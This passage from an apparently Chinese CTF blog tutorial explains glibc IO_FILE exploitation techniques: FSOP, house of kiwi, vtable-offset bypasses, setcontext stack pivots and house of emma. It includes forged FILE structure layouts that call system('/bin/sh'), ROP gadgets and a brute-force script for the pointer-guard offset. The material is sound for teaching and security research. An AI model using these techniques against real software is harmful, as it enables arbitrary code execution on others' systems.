cat</strong>使用。其中<code>_IO_vtable_offset (fp) == 0</code> 即 <code>_vtable_offset</code>为0，另外需要关注<code>_wide_data</code>结构体，该手法会在house of cat中讲解</p><p>条件满足后，会从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历FILE结构体，执行对应虚表中的<code>_IO_OVERFLOW</code>，即<code>&lt;_IO_file_jumps+24&gt;</code></p><h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>该手法用于在程序无<code>exit</code>时触发IO，且能控制<code>rdx</code></p><p>以下为<code>__malloc_assert</code>的代码片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数调用的<code>__fxprintf</code>、<code>fflush</code>都能调用虚表中函数，有劫持的可能。</p><p>以下是进入<code>__malloc_assert</code>的方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>不满足以下条件任一即可进入：</p><ol><li><code>old_size &gt;=MINSIZE</code></li><li><code>old_top.pre_inuse = 0</code></li><li><code>old_top页对齐</code></li></ol><p>通常用的比较多的是第三种，因为页对齐条件较苛刻，通常修改topchunk的size都能不对齐。注意<strong>不能改的太大</strong>，否则会进入别的assert。这里修改的方式一般是构造<strong>堆重叠</strong>或<strong>largebin attack</strong></p><p>接下来讲函数的调用链，这里分<code>__fxprintf</code>和<code>fflush</code>两种方式</p><h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>调用链为</p><p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p><p>需要满足的条件为：</p><ol><li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li><li><code>_lock</code>指向可写地址</li></ol><p>调用后，仅刷新<code>stderr</code>，调用虚表<code>_IO_file_jumps</code>中的<code>_IO_new_file_xsputn</code>，即<code>&lt;_IO_file_jumps+56&gt;</code></p><h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p><p>用的比较少，没什么条件。但是因为在<code>__fxprinf</code>之后，所以需要保证<code>__fxprinf</code>不会挂掉。</p><p>好处是通过这条调用链，在调用<code>sync</code>时的<code>rdx</code>固定，都是<code>IO_helper_jumps</code>，可以结合后面讲到的<code>&lt;setcontext+61&gt;</code>利用。不过高版本中加入虚表检测，这种利用变得困难</p><h2 id="伪造FILE结构体"><a href="#伪造FILE结构体" class="headerlink" title="伪造FILE结构体"></a>伪造FILE结构体</h2><p>如何让我们伪造的FILE结构体在触发IO时被刷新？</p><p>如果使用<strong>FSOP</strong>的方式，程序从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历。故我们可以修改<code>_IO_list_all</code>指针，指向我们伪造的结构体，如果使用largebin attack就可以一步到位指向布置在chunk上的伪造结构体。同时还可以修改<code>_chain</code>指针，劫持到多个伪造的结构体的利用链</p><p>如果使用<strong>house of kiwi</strong>的方式，程序仅刷新<code>stderr</code>，可以修改<code>stderr</code>指针（如果可写），甚至直接修改<code>_IO_2_1_stderr</code>的内容</p><p>伪造FILE的手法繁多，这里举出最原始的一种手法作为例子</p><h3 id="上古时期的FSOP-Glibc"><a href="#上古时期的FSOP-Glibc" class="headerlink" title="上古时期的FSOP(Glibc&lt;2.24)"></a>上古时期的FSOP(Glibc&lt;2.24)</h3><p>因为触发FSOP时，会调用虚表中<code>&lt;_IO_file_jumps+24&gt;</code>处的<code>__overflow</code>函数，我们只需把该位置填入<code>system</code>的地址。当然，虚表不可写，我们可以将<code>vtable</code>处改为我们伪造的虚表。同时此时的<code>rdi</code>指向FILE结构体的<code>_flags</code>，所以可以将该位置填上<code>/bin/sh</code></p><p>构造方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>干净又卫生</p><h3 id="虚表偏移时代-Glibc-2-24"><a href="#虚表偏移时代-Glibc-2-24" class="headerlink" title="虚表偏移时代(Glibc&gt;&#x3D;2.24)"></a>虚表偏移时代(Glibc&gt;&#x3D;2.24)</h3><p>加入了对虚表的检查<code>IO_validate_vtable()</code>与<code>IO_vtable_check()</code>，若无法通过检查，则会报错：<code>Fatal error: glibc detected an invalid stdio handle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable</code> <code>_IO_str_chk_jumps</code>结束的地址。若指针不在glibc的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。</p><p>2.37以前有以下虚表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure><p>从此，虚表指针不能随意伪造了。好在这个检测依旧比较宽泛，我们依旧可以修改<code>vtable</code>为虚表内的其他指针，通过一定的<strong>偏移</strong>调用<strong>其他虚表</strong>内的函数</p><p>例如，原本house of kiwi会触发<code>&lt;_IO_file_jumps+56&gt;</code>处的<code>_IO_new_file_xsputn</code>函数，我们希望调用<code>&lt;_IO_cookie_jumps+120&gt;</code>处的<code>_IO_cookie_write</code>函数。原本<code>vtable</code>指向<code>_IO_file_jumps</code>，调用函数时则会将指针加上56。我们把<code>vtable</code>设置为<code>&lt;_IO_cookie_jumps+64&gt;</code>，那么在实际调用时，就会调用到<code>&lt;_IO_cookie_jumps+64+56&gt;</code>处的目标函数。这就是<strong>虚表偏移</strong>的思想，将执行流劫持到已有的函数上。</p><h1 id="新时代的高版本IOFILE利用"><a href="#新时代的高版本IOFILE利用" class="headerlink" title="新时代的高版本IOFILE利用"></a>新时代的高版本IOFILE利用</h1><p>高版本下的IOFILE利用方式很多，但大多不外乎都是利用<strong>虚表偏移</strong>的思想伪造FILE结构体，并通过以上的方式<strong>触发IO</strong>，从而getshell或者orw</p><p>这里介绍几种<del>我会的</del>比较好用的</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>相较于他的实战意义，kiwi更大的价值可能在于它的两条思路，一条是上文提到的<code>__malloc_assert</code>触发IO，另一条则是<code>setcontext&lt;+61&gt;</code></p><p>这是一个函数的片段，兼具<strong>布置寄存器、栈迁移</strong>的功能，常常在沙盒限制<code>execve</code>的情况下用来打<strong>orw链</strong>，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#基本上都能跳</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br></pre></td></tr></table></figure><p>围绕<code>rdx</code>进行参数的布置，就能设置好各个寄存器</p><p>这里最重要的两条是</p><p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p><p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p><p>我们通常将<code>rcx</code>布置为<code>ret</code>的gadget，这样在最后<code>ret</code>的时候就能实现栈迁移到赋给<code>rsp</code>的地址上</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>可以理解为kiwi衍生出的攻击手法，需要以下三个条件</p><ol><li><p>可以<strong>任意写</strong>一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</p></li><li><p>一次<strong>任意地址读</strong> 或 再来一次<strong>任意写</strong></p></li><li><p>可以<strong>触发 IO 流</strong>（FSOP、house of kiwi）</p></li></ol><p>利用的虚表为<code>_IO_cookie_jumps</code>，存在拓展结构<code>_IO_cookie_file</code>（还是<code>_IO_FILE_plus</code>加长版），多了一个函数表，存在劫持的可能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>需要调用的虚表函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写了4个函数，其实大同小异，都调用了一个从<code>_IO_cookie_file</code>结构体的函数表中取出的函数指针，以<code>_IO_cookie_write</code>为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//取出函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//指针保护</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//调用函数</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们只需伪造<code>_IO_cookie_file</code>结构体的函数表，就能调用任意函数。同时这里的<code>rdi</code>是可控的。如果要打getshell，可以直接构造；如果要打orw，可以利用libc中一个gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><p>完成从可控<code>rdi</code>到可控<code>rdx</code>的转换</p><p>此外，<code>_IO_cookie_file</code>里的函数指针不能直接伪造，因为默认开启了PTR_DEMANGLE （指针保护）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p><code>__pointer_chk_guard</code>存在于TLS段上，将其ROR移位0x11后再与存入的地址进行异或</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p><p><code>fs[0x30]</code>的值位于与libc相邻的ld空间中，这个位置距离libc地址的偏移固定，可能与本地patchelf后不一致，可以通过爆破得到。因为偏移的变化值往往在地址末尾的第四个、第五个数（末三位不变），可编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>详细题解可以看<a href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of 